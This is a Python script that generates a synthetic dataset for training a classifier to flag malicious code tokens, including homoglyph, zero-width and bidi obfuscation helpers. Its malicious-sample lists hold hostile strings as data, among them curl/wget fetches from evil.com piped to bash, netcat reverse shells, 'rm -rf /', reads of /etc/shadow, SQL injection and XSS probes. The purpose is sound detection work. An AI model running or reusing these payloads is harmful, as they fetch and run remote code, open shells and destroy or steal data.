"""
Phase 3 — Dataset Builder
=========================
Builds a 50k token security dataset with:
  • SAFE:       25 000 samples
  • SUSPICIOUS: 15 000 samples
  • MALICIOUS:  10 000 samples

Adversarial augmentations:
  • Unicode homoglyph injection
  • Zero-width character insertion
  • Base64 encoding
  • Token splitting (SELECT -> SEL + ECT)
  • Bidi character injection

Run:
    python ML_model/build_dataset.py
Outputs:
    data/processed/token_security_dataset_v2.csv
"""

from __future__ import annotations

import base64
import csv
import math
import os
import random
import string
import sys
import unicodedata
from collections import Counter
from dataclasses import dataclass
from typing import List, Tuple

# Make W5_6 importable
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from ML_model.recovery_engine import (
    RecoveryEngine, _shannon_entropy, _keyword_score, _fuzzy_keyword_score,
    _is_base64, _decoded_keyword_score, _count_zws, _count_bidi,
    _count_confusables, DANGEROUS_APIS, SQL_KEYWORDS, CONFUSABLE,
)

recovery = RecoveryEngine()

# ─────────────────────────────────────────────────────────────────
# FEATURE EXTRACTION (flat — no SecureToken needed for dataset)
# ─────────────────────────────────────────────────────────────────

def extract_flat_features(raw: str, label_hint: str = "") -> dict:
    """
    Extract all 45 features from a raw string (no SecureToken required).
    Used during dataset construction.
    """
    rec    = recovery.recover(raw)
    length = len(raw)

    non_ascii   = sum(1 for ch in raw if ord(ch) >= 128)
    digit_count = sum(c.isdigit() for c in raw)
    upper_count = sum(c.isupper() for c in raw)
    special_cnt = sum(not c.isalnum() and c != '_' for c in raw)

    bigrams  = [raw[i:i+2] for i in range(len(raw) - 1)]
    trigrams = [raw[i:i+3] for i in range(len(raw) - 2)]

    char_ent = _shannon_entropy(raw)
    unique   = len(set(raw))
    norm_ent = char_ent / math.log2(unique) if unique > 1 else 0.0

    return {
        # Identity
        "raw":                   raw,
        "recovered":             rec.recovered,
        # Length / type
        "length":                length,
        # Unicode
        "zero_width_count":      _count_zws(raw),
        "bidi_count":            _count_bidi(raw),
        "confusable_count":      _count_confusables(raw),
        "non_ascii_ratio":       non_ascii / max(length, 1),
        # Entropy
        "char_entropy":          round(char_ent, 4),
        "bigram_entropy":        round(_shannon_entropy(''.join(bigrams)), 4) if bigrams else 0.0,
        "trigram_entropy":       round(_shannon_entropy(''.join(trigrams)), 4) if trigrams else 0.0,
        "normalised_entropy":    round(norm_ent, 4),
        # Char ratios
        "digit_ratio":           digit_count / max(length, 1),
        "upper_ratio":           upper_count / max(length, 1),
        "special_ratio":         special_cnt / max(length, 1),
        # Recovery
        "recovery_changed_flag": int(rec.changed),
        "normalized_diff_ratio": round(rec.diff_ratio, 4),
        "zws_removed":           rec.zws_removed,
        "confusables_mapped":    rec.confusables_mapped,
        # Encoding
        "is_base64":             int(_is_base64(raw)),
        "decoded_keyword_score": round(_decoded_keyword_score(raw), 4),
        # Security scores
        "keyword_score":         round(_keyword_score(raw), 4),
        "keyword_score_recovered": round(_keyword_score(rec.recovered), 4),
        "fuzzy_keyword_score":   round(_fuzzy_keyword_score(raw), 4),
        "dangerous_api_flag":    int(raw.lower() in DANGEROUS_APIS),
        "sql_keyword_flag":      int(raw.upper() in SQL_KEYWORDS),
        # Context placeholders (set to 0 — filled during sequence building)
        "matches_sql":           int(any(kw in raw.upper() for kw in SQL_KEYWORDS)),
        "matches_shell":         int(any(kw in raw.lower() for kw in
                                   {"rm","wget","curl","bash","sh","nc","cat"})),
        "precedes_exec":         int(raw.lower() in {"exec", "eval", "compile"}),
        "is_suspicious":         0,  # filled below
        "security_score":        0.0,
        "script_count":          0,  # filled below
        "homoglyph_count":       _count_confusables(raw),
    }


def _compute_security_score(feat: dict) -> float:
    """Simple rule-based security score from features (mirrors SecurityScore.compute)."""
    score = 0.0
    if feat["non_ascii_ratio"] > 0:       score += 0.15
    if feat["zero_width_count"] > 0:      score += 0.30
    if feat["char_entropy"] > 3.5:        score += 0.20
    if feat["confusable_count"] > 0:      score += 0.25
    if feat["precedes_exec"]:             score += 0.30
    if feat["matches_sql"]:               score += 0.15
    if feat["matches_shell"]:             score += 0.30
    if feat["is_base64"]:                 score += 0.10
    return min(score, 1.0)


# ─────────────────────────────────────────────────────────────────
# ADVERSARIAL AUGMENTATION HELPERS
# ─────────────────────────────────────────────────────────────────

_CYRILLIC_LOOKALIKES = {
    'a': '\u0430', 'e': '\u0435', 'o': '\u043e',
    'c': '\u0441', 'x': '\u0445', 'y': '\u0443',
    'i': '\u0456',  'r': '\u0440', 's': '\u0455',
}

def aug_homoglyph(token: str, ratio: float = 0.3) -> str:
    """Replace some Latin chars with Cyrillic homoglyphs."""
    chars = list(token)
    for i, ch in enumerate(chars):
        if ch in _CYRILLIC_LOOKALIKES and random.random() < ratio:
            chars[i] = _CYRILLIC_LOOKALIKES[ch]
    return ''.join(chars)

def aug_zero_width(token: str) -> str:
    """Insert a zero-width space at a random interior position."""
    if len(token) < 2:
        return token
    pos = random.randint(1, len(token) - 1)
    return token[:pos] + '\u200b' + token[pos:]

def aug_bidi(token: str) -> str:
    """Wrap token with bidi override characters."""
    return '\u202a' + token + '\u202c'

def aug_base64(token: str) -> str:
    """Encode token as base64 string."""
    return base64.b64encode(token.encode()).decode()

def aug_split_keyword(token: str) -> str:
    """Split a keyword in the middle with an underscore (evade exact matching)."""
    if len(token) < 4:
        return token
    mid = len(token) // 2
    return token[:mid] + '_' + token[mid:]


# ─────────────────────────────────────────────────────────────────
# SAFE SAMPLES (25 000)
# ─────────────────────────────────────────────────────────────────

SAFE_IDENTIFIERS = [
    "x", "i", "j", "n", "k", "result", "count", "index", "flag",
    "my_var", "total", "value", "name", "data", "item", "obj",
    "msg", "text", "output", "input", "buf", "token", "key",
    "config", "handler", "callback", "error", "status", "code",
    "body", "response", "request", "client", "server", "host",
    "port", "path", "file", "line", "word", "char", "num", "val",
    "tmp", "ret", "out", "arr", "lst", "dct", "tpl", "cls", "fn",
    "user_id", "item_count", "max_val", "min_val", "avg_score",
    "is_valid", "has_data", "get_value", "set_value", "load_data",
]

SAFE_KEYWORDS = [
    "def", "class", "return", "if", "else", "elif", "for", "while",
    "import", "from", "pass", "break", "continue", "try", "except",
    "finally", "with", "as", "raise", "yield", "lambda", "True",
    "False", "None", "and", "or", "not", "in", "is",
]

SAFE_OPS = ["=", "+=", "-=", "*=", "/=", "==", "!=", "<", ">",
            "<=", ">=", "+", "-", "*", "/", "%", "**", "//",
            "(", ")", "[", "]", "{", "}", ",", ":", ";", ".", "\n"]

def _gen_safe(n: int) -> List[Tuple[str, str]]:
    rows = []
    for _ in range(n):
        r = random.random()
        if r < 0.30:
            raw = random.choice(SAFE_IDENTIFIERS)
        elif r < 0.45:
            raw = random.choice(SAFE_KEYWORDS)
        elif r < 0.55:
            raw = str(random.randint(0, 99999))
        elif r < 0.62:
            raw = f"{random.uniform(0, 1e4):.4f}"
        elif r < 0.70:
            inner = ''.join(random.choices(string.ascii_lowercase + ' ', k=random.randint(2, 12)))
            raw = f'"{inner}"'
        elif r < 0.78:
            raw = ''.join(random.choices(string.ascii_lowercase + '_', k=random.randint(2, 10)))
        elif r < 0.86:
            raw = random.choice(SAFE_OPS)
        elif r < 0.93:
            raw = f"# {' '.join(random.choices(SAFE_IDENTIFIERS, k=3))}"
        else:
            # CamelCase safe identifier
            parts = [random.choice(SAFE_IDENTIFIERS).capitalize()
                     for _ in range(random.randint(1, 3))]
            raw = ''.join(parts)
        rows.append((raw, "SAFE"))
    return rows


# ─────────────────────────────────────────────────────────────────
# SUSPICIOUS SAMPLES (15 000)
# ─────────────────────────────────────────────────────────────────

_B64_CHARSET = string.ascii_letters + string.digits + '+/='

_HOMOGLYPH_SEEDS = [
    "аdmin", "uѕer", "раypal", "gооgle", "miсrosoft",
    "lоgin", "раssword", "аccount", "сloud", "аpple",
    "ѕystem", "сheck", "раss", "tоken", "аuth",
]

_ZWS_SEEDS = [
    "safe\u200bVar", "to\u200bken", "val\u200bidate",
    "pass\u200bword", "ad\u200bmin", "nor\u200bmal",
    "check\u200bsum", "se\u200bcret", "user\u200bname",
]

def _gen_suspicious(n: int) -> List[Tuple[str, str]]:
    rows = []
    b64_chars = _B64_CHARSET

    for _ in range(n):
        r = random.random()

        if r < 0.12:
            # High-entropy random string
            raw = ''.join(random.choices(string.printable.strip(), k=random.randint(8, 24)))

        elif r < 0.24:
            # Base64-looking string
            ln  = random.choice([16, 20, 24, 28, 32])
            raw = ''.join(random.choices(b64_chars.rstrip('='), k=ln))
            raw += '=' * ((4 - ln % 4) % 4)

        elif r < 0.36:
            # Real homoglyph seed
            raw = random.choice(_HOMOGLYPH_SEEDS)

        elif r < 0.48:
            # Procedural homoglyph injection
            base = random.choice(SAFE_IDENTIFIERS)
            raw  = aug_homoglyph(base, ratio=0.4)

        elif r < 0.58:
            # Zero-width seeded
            raw = random.choice(_ZWS_SEEDS)

        elif r < 0.68:
            # Zero-width procedural
            base = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 12)))
            raw  = aug_zero_width(base)

        elif r < 0.76:
            # Long hex-looking uppercase string
            raw = ''.join(random.choices(string.hexdigits.upper(), k=random.randint(16, 32)))

        elif r < 0.84:
            # Bidi injection
            base = random.choice(SAFE_IDENTIFIERS)
            raw  = aug_bidi(base)

        elif r < 0.92:
            # Mixed script: Latin + Cyrillic random mix
            latin    = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
            cyrillic = random.choice(list(_CYRILLIC_LOOKALIKES.values()))
            pos      = random.randint(0, len(latin))
            raw      = latin[:pos] + cyrillic + latin[pos:]

        else:
            # Suspicious-looking identifier with high digit ratio
            letters = ''.join(random.choices(string.ascii_letters, k=4))
            digits  = ''.join(random.choices(string.digits, k=random.randint(4, 10)))
            raw     = letters + digits

        rows.append((raw, "SUSPICIOUS"))
    return rows


# ─────────────────────────────────────────────────────────────────
# MALICIOUS SAMPLES (10 000)
# ─────────────────────────────────────────────────────────────────

_INJECTION_SEEDS = [
    "exec", "eval", "__import__", "compile", "globals", "locals",
    "SELECT * FROM users", "DROP TABLE users", "1=1--",
    "UNION SELECT null,null,null--",
    "os.system", "subprocess.call", "pickle.loads", "marshal.loads",
    "; rm -rf /", "&& cat /etc/passwd", "| nc -e /bin/bash",
    "<script>alert(1)</script>", "javascript:void(0)",
    "__import__('os').system('id')",
    "eval(base64.b64decode(payload))",
    "exec(compile(source,'<string>','exec'))",
]

_SQL_TEMPLATES = [
    "SELECT {col} FROM {tbl} WHERE 1=1",
    "SELECT {col} FROM {tbl} WHERE id=1 UNION SELECT null--",
    "INSERT INTO {tbl} VALUES('{val}')",
    "DROP TABLE {tbl}--",
    "'; DROP TABLE {tbl};--",
    "1' OR '1'='1",
    "admin'--",
]

_SHELL_TEMPLATES = [
    "; {cmd} &",
    "$(  {cmd}  )",
    "`{cmd}`",
    "| {cmd}",
    "&& {cmd}",
    "{cmd} > /dev/null",
]

_SHELL_CMDS = [
    "rm -rf /", "wget http://evil.com/x.sh",
    "curl http://evil.com | bash", "nc -e /bin/sh 10.0.0.1 4444",
    "chmod +x /tmp/x && /tmp/x", "cat /etc/shadow",
    "python3 -c \"import os;os.system('id')\"",
]

def _rand(charset, lo, hi):
    return ''.join(random.choices(charset, k=random.randint(lo, hi)))

def _gen_malicious(n: int) -> List[Tuple[str, str]]:
    rows = []
    for _ in range(n):
        r = random.random()

        if r < 0.25:
            raw = random.choice(_INJECTION_SEEDS)

        elif r < 0.40:
            # Obfuscated: keyword buried in noise
            kw    = random.choice(["exec", "eval", "system", "DROP", "SELECT"])
            noise = _rand(string.ascii_lowercase, 1, 4)
            raw   = noise + kw + noise

        elif r < 0.52:
            # SQL injection template
            tpl = random.choice(_SQL_TEMPLATES)
            raw = tpl.format(
                col=_rand(string.ascii_lowercase, 3, 6),
                tbl=_rand(string.ascii_lowercase, 4, 8),
                val=_rand(string.printable.strip(), 3, 8),
            )

        elif r < 0.62:
            # Shell injection template
            tpl = random.choice(_SHELL_TEMPLATES)
            raw = tpl.format(cmd=random.choice(_SHELL_CMDS))

        elif r < 0.70:
            # Base64-encoded malicious payload
            payload = random.choice(["exec(", "eval(", "os.system(", "__import__("])
            raw = base64.b64encode(payload.encode()).decode()

        elif r < 0.78:
            # Homoglyph-obfuscated dangerous keyword
            kw  = random.choice(["exec", "eval", "admin", "system"])
            raw = aug_homoglyph(kw, ratio=0.6)

        elif r < 0.86:
            # Zero-width injected dangerous keyword
            kw  = random.choice(["exec", "eval", "system", "DROP"])
            raw = aug_zero_width(kw)

        elif r < 0.93:
            # Split dangerous keyword
            kw  = random.choice(["SELECT", "system", "execute", "UNION"])
            raw = aug_split_keyword(kw)

        else:
            # Bidi-wrapped dangerous string
            raw = aug_bidi(random.choice(_INJECTION_SEEDS[:8]))

        rows.append((raw, "MALICIOUS"))
    return rows


# ─────────────────────────────────────────────────────────────────
# MAIN BUILD
# ─────────────────────────────────────────────────────────────────

# All 45 feature column names (must match extract_flat_features keys — minus raw/recovered)
FEATURE_COLS = [
    "length", "zero_width_count", "bidi_count", "confusable_count",
    "non_ascii_ratio", "char_entropy", "bigram_entropy", "trigram_entropy",
    "normalised_entropy", "digit_ratio", "upper_ratio", "special_ratio",
    "recovery_changed_flag", "normalized_diff_ratio", "zws_removed",
    "confusables_mapped", "is_base64", "decoded_keyword_score",
    "keyword_score", "keyword_score_recovered", "fuzzy_keyword_score",
    "dangerous_api_flag", "sql_keyword_flag",
    "matches_sql", "matches_shell", "precedes_exec",
    "is_suspicious", "security_score", "script_count", "homoglyph_count",
]


def build_dataset(
    n_safe: int       = 25_000,
    n_suspicious: int = 15_000,
    n_malicious: int  = 10_000,
    output_path: str  = "data/processed/token_security_dataset_v2.csv",
    seed: int         = 42,
):
    random.seed(seed)

    print(f"Building dataset: SAFE={n_safe}, SUSPICIOUS={n_suspicious}, MALICIOUS={n_malicious}")

    all_rows: List[Tuple[str, str]] = []
    all_rows.extend(_gen_safe(n_safe))
    all_rows.extend(_gen_suspicious(n_suspicious))
    all_rows.extend(_gen_malicious(n_malicious))

    # Shuffle
    random.shuffle(all_rows)

    os.makedirs(os.path.dirname(output_path), exist_ok=True)

    header = ["raw", "recovered"] + FEATURE_COLS + ["label"]

    written = 0
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=header)
        writer.writeheader()

        for raw, label in all_rows:
            feat = extract_flat_features(raw, label)
            # Compute derived fields
            feat["security_score"] = round(_compute_security_score(feat), 4)
            feat["is_suspicious"]  = int(feat["security_score"] >= 0.5)
            # script_count: count distinct Unicode scripts
            scripts = set()
            for ch in raw:
                uname = unicodedata.name(ch, "")
                if uname:
                    s = uname.split()[0]
                    if s in {"LATIN", "CYRILLIC", "GREEK", "ARABIC", "HEBREW"}:
                        scripts.add(s)
            feat["script_count"] = len(scripts)

            row = {k: feat.get(k, 0) for k in header}
            row["raw"]       = raw
            row["recovered"] = feat["recovered"]
            row["label"]     = label
            writer.writerow(row)
            written += 1

    print(f"Dataset saved -> {output_path}  ({written} rows)")
    _print_stats(all_rows)
    return output_path


def _print_stats(rows):
    from collections import Counter
    counts = Counter(label for _, label in rows)
    total  = len(rows)
    print("\nClass distribution:")
    for lbl in ["SAFE", "SUSPICIOUS", "MALICIOUS"]:
        n = counts[lbl]
        print(f"  {lbl:12s} {n:6d}  ({100*n/total:.1f}%)")
    print(f"  {'TOTAL':12s} {total:6d}")


if __name__ == "__main__":
    build_dataset()
